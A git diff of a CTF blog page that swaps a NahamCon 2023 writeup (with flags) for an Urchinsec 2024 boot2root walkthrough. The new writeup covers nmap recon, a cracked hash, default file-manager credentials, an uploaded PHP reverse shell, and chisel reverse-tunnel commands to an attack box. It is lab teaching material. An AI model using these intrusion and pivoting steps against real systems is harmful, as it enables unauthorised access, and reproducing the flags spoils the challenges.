@@ -1,28 +1,32 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Nahamcon CTF 2023 writeups warmups  blobber Thic challenge had a downloadable part , the file was a sqlite database.
-I opened the file using sqlite database browser
-browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as entries. Read more here
-we can use this sql statement to get the blob'>
-<title>Nahamcon2023</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Writeup for urchinsec 2024 boot2root challenge This is the writeup for the boot 2 root challenge Bill Systems which i got the second solve.
+This challneg requires knowledge in:
+ recon persistense lateral movement priviledge escalation   Bill Systems categoty: boot2root difficulty: medium
+we are given:
+1 2 3 4  SCOPE OF ENGAGEMENT domains : *.billsys.urc IP : 45.79.66.97   First we need to gather more info, so i ran an nmap scan to see open ports'>
+<title>Urchinsec ctf 2024</title>
 
-<link rel='canonical' href='https://f0rk3b0mb.github.io/p/nahamcon2023/'>
+<link rel='canonical' href='https://f0rk3b0mb.github.io/p/urchinsec-ctf-2024/'>
 
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Nahamcon2023'>
-<meta property='og:description' content='Nahamcon CTF 2023 writeups warmups  blobber Thic challenge had a downloadable part , the file was a sqlite database.
-I opened the file using sqlite database browser
-browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as entries. Read more here
-we can use this sql statement to get the blob'>
-<meta property='og:url' content='https://f0rk3b0mb.github.io/p/nahamcon2023/'>
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Urchinsec ctf 2024'>
+<meta property='og:description' content='Writeup for urchinsec 2024 boot2root challenge This is the writeup for the boot 2 root challenge Bill Systems which i got the second solve.
+This challneg requires knowledge in:
+ recon persistense lateral movement priviledge escalation   Bill Systems categoty: boot2root difficulty: medium
+we are given:
+1 2 3 4  SCOPE OF ENGAGEMENT domains : *.billsys.urc IP : 45.79.66.97   First we need to gather more info, so i ran an nmap scan to see open ports'>
+<meta property='og:url' content='https://f0rk3b0mb.github.io/p/urchinsec-ctf-2024/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-06-15T20:58:33&#43;03:00'/><meta property='article:modified_time' content='2023-06-15T20:58:33&#43;03:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-04-28T13:23:40&#43;03:00'/><meta property='article:modified_time' content='2024-04-28T13:23:40&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/urchinsec.png' />
 <meta name="twitter:site" content="@f0rk3b0mb">
-    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Nahamcon2023">
-<meta name="twitter:description" content="Nahamcon CTF 2023 writeups warmups  blobber Thic challenge had a downloadable part , the file was a sqlite database.
-I opened the file using sqlite database browser
-browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as entries. Read more here
-we can use this sql statement to get the blob">
+    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Urchinsec ctf 2024">
+<meta name="twitter:description" content="Writeup for urchinsec 2024 boot2root challenge This is the writeup for the boot 2 root challenge Bill Systems which i got the second solve.
+This challneg requires knowledge in:
+ recon persistense lateral movement priviledge escalation   Bill Systems categoty: boot2root difficulty: medium
+we are given:
+1 2 3 4  SCOPE OF ENGAGEMENT domains : *.billsys.urc IP : 45.79.66.97   First we need to gather more info, so i ran an nmap scan to see open ports"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/urchinsec.png' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
 var doNotTrack = false;
@@ -337,25 +341,9 @@ if (!doNotTrack) {
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li>
+    <li><a href="#writeup-for-urchinsec-2024-boot2root-challenge">Writeup for urchinsec 2024 boot2root challenge</a>
       <ol>
-        <li>
-          <ol>
-            <li><a href="#nahamcon-ctf-2023-writeups">Nahamcon CTF 2023 writeups</a></li>
-          </ol>
-        </li>
-        <li><a href="#warmups">warmups</a></li>
-        <li><a href="#blobber">blobber</a></li>
-        <li><a href="#ninety-one">ninety one</a></li>
-        <li><a href="#glasses">glasses</a></li>
-        <li><a href="#web-category">web category</a></li>
-        <li><a href="#starwars">starwars</a></li>
-        <li><a href="#misc-category">misc category</a></li>
-        <li><a href="#zombies">zombies</a></li>
-        <li><a href="#mobile-category">mobile category</a></li>
-        <li><a href="#jninjaspeak">jninjaspeak</a></li>
-        <li><a href="#fortune-teller">Fortune teller</a></li>
-        <li><a href="#wheres-waldo">wheres waldo</a></li>
+        <li><a href="#bill-systems">Bill Systems</a></li>
       </ol>
     </li>
   </ol>
@@ -369,8 +357,16 @@ if (!doNotTrack) {
 
 
             <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/urchinsec-ctf-2024/">
+                
+                    <img src="/cover/urchinsec.png" loading="lazy" alt="Featured image of post Urchinsec ctf 2024" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
@@ -385,7 +381,7 @@ if (!doNotTrack) {
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/nahamcon2023/">Nahamcon2023</a>
+            <a href="/p/urchinsec-ctf-2024/">Urchinsec ctf 2024</a>
         </h2>
     
         
@@ -407,7 +403,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Jun 15, 2023</time>
+                <time class="article-time--published">Apr 28, 2024</time>
             </div>
         
 
@@ -422,7 +418,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    6 minute read
+                    7 minute read
                 </time>
             </div>
         
@@ -437,25 +433,407 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <h4 id="nahamcon-ctf-2023-writeups">Nahamcon CTF 2023 writeups</h4>
-<h3 id="warmups">warmups</h3>
+    <h2 id="writeup-for-urchinsec-2024-boot2root-challenge">Writeup for urchinsec 2024 boot2root challenge</h2>
+<p>This is the writeup for the boot 2 root challenge Bill Systems  which i got the second solve.</p>
+<p>This challneg requires knowledge in:</p>
+<ul>
+<li>recon</li>
+<li>persistense</li>
+<li>lateral movement</li>
+<li>priviledge escalation</li>
+</ul>
 <hr>
-<h3 id="blobber">blobber</h3>
-<p>Thic challenge had a downloadable part , the file was a sqlite database.</p>
-<p>I opened the file using sqlite database browser</p>
-<p><img src="/images/nahamcon2023/sqlite.png"
+<h3 id="bill-systems">Bill Systems</h3>
+<p>categoty: boot2root
+difficulty: medium</p>
+<p>we are given:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">SCOPE OF ENGAGEMENT
+domains : *.billsys.urc
+IP : 45.79.66.97
+
+</code></pre></td></tr></table>
+</div>
+</div><p>First we need to gather more info, so i ran an nmap scan to see open ports</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 9.7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 9e:cd:9e:38:58:35:4c:24:1a:01:29:0d:9d:26:fe:2b (ECDSA)
+|_  256 50:35:25:83:7d:aa:d7:42:43:d4:bb:fa:e8:6c:12:bb (ED25519)
+25/tcp   filtered smtp
+80/tcp   open     http
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 27 Apr 2024 12:15:19 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 27 Apr 2024 12:15:12 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Sat, 27 Apr 2024 12:15:13 GMT
+|_    Content-Length: 0
+443/tcp  open     https?
+3000/tcp open     ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=7748aed9b1afa3fe; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=U5NJcsVjX-xLNIhZ6o64wSWiZd86MTcxNDIyMDExMzY5MDg3MDY4Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 27 Apr 2024 12:15:13 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&#34;en-US&#34; data-theme=&#34;gitea-auto&#34;&gt;
+|     &lt;head&gt;
+|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+|     &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpem
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=e41496a78b8b88ad; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=vUtLqCC5_VSGwBmhopYmXC6PyWM6MTcxNDIyMDEyMDUyMzg0MjU2Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, 27 Apr 2024 12:15:20 GMT
+|_    Content-Length: 0
+3306/tcp open     mysql       MariaDB (unauthorized)
+3333/tcp open     nagios-nsca Nagios NSCA
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94SVN%I=7%D=4/27%Time=662CEC50%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,4B,&#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x202
+SF:024\x2012:15:12\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(HTTPOptions,
+SF:4B,&#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:
+SF:15:13\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPRequest,67,&#34;HTTP/1
+SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(FourOhF
+SF:ourRequest,4B,&#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Apr\x20
+SF:2024\x2012:15:19\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(GenericLine
+SF:s,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
+SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
+SF:&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+SF:0Request&#34;)%r(SSLSessionReq,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
+SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
+SF:\r\n400\x20Bad\x20Request&#34;)%r(TerminalServerCookie,67,&#34;HTTP/1\.1\x20400
+SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
+SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(TLSSessionReq,67,
+SF:&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
+SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(
+SF:Kerberos,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request&#34;)%r(LPDString,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
+SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
+SF:00\x20Bad\x20Request&#34;)%r(LDAPSearchReq,67,&#34;HTTP/1\.1\x20400\x20Bad\x20R
+SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
+SF:x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(SIPOptions,67,&#34;HTTP/1\.1\x204
+SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
+SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port3000-TCP:V=7.94SVN%I=7%D=4/27%Time=662CEC51%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request&#34;)%r(GetRequest,38A1,&#34;HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+SF:ea=7748aed9b1afa3fe;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+SF:kie:\x20_csrf=U5NJcsVjX-xLNIhZ6o64wSWiZd86MTcxNDIyMDExMzY5MDg3MDY4Nw;\x
+SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:15:13\x
+SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en-US\&#34;\x20data-theme=
+SF:\&#34;gitea-auto\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;widt
+SF:h=device-width,\x20initial-scale=1\&#34;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea&lt;/title&gt;\n\t&lt;link\x20rel=\&#34;manifest\&#34;\x20href=\&#34;
+SF:data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG
+SF:9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic
+SF:3RhcnRfdXJsIjoiaHR0cDovL2dpdC5iaWxsc3lzLnVyYy8iLCJpY29ucyI6W3sic3JjIjoi
+SF:aHR0cDovL2dpdC5iaWxsc3lzLnVyYy9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6Iml
+SF:tYWdlL3BuZyIsInNpem&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
+SF:\n\r\n400\x20Bad\x20Request&#34;)%r(HTTPOptions,197,&#34;HTTP/1\.0\x20405\x20Me
+SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
+SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
+SF:et-Cookie:\x20i_like_gitea=e41496a78b8b88ad;\x20Path=/;\x20HttpOnly;\x2
+SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=vUtLqCC5_VSGwBmhopYmXC6PyWM6MTcxN
+SF:DIyMDEyMDUyMzg0MjU2Mw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
+SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2027\x20A
+SF:pr\x202024\x2012:15:20\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPR
+SF:equest,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+SF:quest&#34;);
+
+</code></pre></td></tr></table>
+</div>
+</div><p>Only ports of interest were 22, 25 , 80 , 3306</p>
+<p>on port 80 is bills portfolio other than that there is nothing interesting</p>
+<p><img src="/"
 	
 	
 	
 	loading="lazy"
 	
-		alt="sqlite"
+		alt="portfoilio"
 	
 	
 ></p>
-<p>browsing the data there is only gibberish , except on line 238 where data is a blob object.Blobs in sqlite is whereby files can be addedtto database as  entries. Read more <a class="link" href="https://rogerbinns.github.io/apsw/blob.html"  target="_blank" rel="noopener"
+<p>so we try and get the subdomains:</p>
+<p>There are two subdomains :</p>
+<ul>
+<li>git.billsys.urc  - this is running a local instance of gittea</li>
+<li>storage.billsys.urc - this is running am instance of tiny file manager</li>
+</ul>
+<hr>
+<p>On git.billsys.urc  we create an account and login. There are other users and repos but the one that sticks out is that of bill.</p>
+<p><img src="/images/urchinsec/gittea.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="gittea"
+	
+	
+></p>
+<p>It is source code for a python web app called sesame.</p>
+<p>Looking at the commits we see a sqllite instance database that had been ommited we download it and view contents</p>
+<p><img src="/images/urchinsec/keys.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="keys"
+	
+	
+></p>
+<p><img src="/images/urchinsec/users.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="users"
+	
+	
+></p>
+<p>cracking the user hash we get the password</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f : password123
+
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>On storage.billsys.urc we are provided with an instance of tiny file manager we also require creds to access it. It used defauld creds for tiny file manager.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">admin : admin@123
+
+</code></pre></td></tr></table>
+</div>
+</div><p>Here we can upload files , so i upload a php rev shell</p>
+<hr>
+<p>Dropping to the shell we see that we are user &ldquo;http&rdquo;. There is no obvious method of priv esc.</p>
+<p>I was stuck here till i checked the open ports on the machine using netstat.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      38132/python3       
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
+tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+tcp6       0      0 :::3333                 :::*                    LISTEN      - 
+
+</code></pre></td></tr></table>
+</div>
+</div><p>As you see above there is a service on port 8080 that is only accessed internally.</p>
+<p>To access this from our attack box we will need to use a tunnel client like chisel. You can get chisel &raquo; <a class="link" href="https://github.com/jpillora/chisel"  target="_blank" rel="noopener"
     >here</a></p>
-<p>we can use this sql statement to get the blob</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -463,327 +841,16 @@ if (!doNotTrack) {
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-<span class="k">select</span> data from blobber where <span class="nv">id</span><span class="o">=</span><span class="m">238</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">on attackbox &gt;&gt; ./chisel server -p 8000 --reverse
+on chal machine  &gt;&gt; ./chisel client &lt;ip&gt;:8000 R:8001:127.0.0.1:8080
 
 </code></pre></td></tr></table>
 </div>
-</div><p>Then save it to a file ,  the resulting file in is a bzip2 archive, extracting , you get an image of the flag</p>
-<p><img src="/images/nahamcon2023/blobber_extract.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="flag"
-	
-	
-></p>
+</div><p>After this we can access the service on port 80 which is the sesame application we got the src earlier.</p>
 <hr>
-<h3 id="ninety-one">ninety one</h3>
-<p>In this challenge you are provided with an encoded string</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">@iH&lt;,<span class="o">{</span><span class="p">|</span>jbRH?L^VjGJH&lt;vn3p7I,x~@1jyt&gt;x?,!YAJr*08P
-</code></pre></td></tr></table>
-</div>
-</div><p>I used this tool &raquo; <a class="link" href="https://www.dcode.fr/base-91-encoding"  target="_blank" rel="noopener"
-    >here</a> to analyse and decode it , it was encrypted using base91 encoding</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-flag<span class="o">{</span>dfb88c7d9ca38e71dc27e1072fc43d1b<span class="o">}</span>
-</code></pre></td></tr></table>
-</div>
-</div><hr>
-<h3 id="glasses">glasses</h3>
-<hr>
-<p>This challenge you were provided with a webpage. It had no functionality, based on the title of the challenge it is obvious that we nee to find something hidden.</p>
-<p>Lokking through the source I found  obfuscated js code. You can use this tool &raquo; <a class="link" href="https://lelinhtinh.github.io/de4js/"  target="_blank" rel="noopener"
-    >here</a> to deobfuscate it . It returns  html code the with the flag</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-flag<span class="o">{</span>8084e4530cf649814456f2a291eb81e9<span class="o">}</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><hr>
-<h3 id="web-category">web category</h3>
-<hr>
-<h3 id="starwars">starwars</h3>
-<hr>
-<p>In this challenge you are provided with a web endpoint that allows you to signup and login The goal is to login as admin , you can also comment and the admin reviews your comment , obvoiusly it is classic xxs</p>
-<p><img src="/images/nahamcon2023/alert.png"
-	
-	
-	
-	loading="lazy"
-	
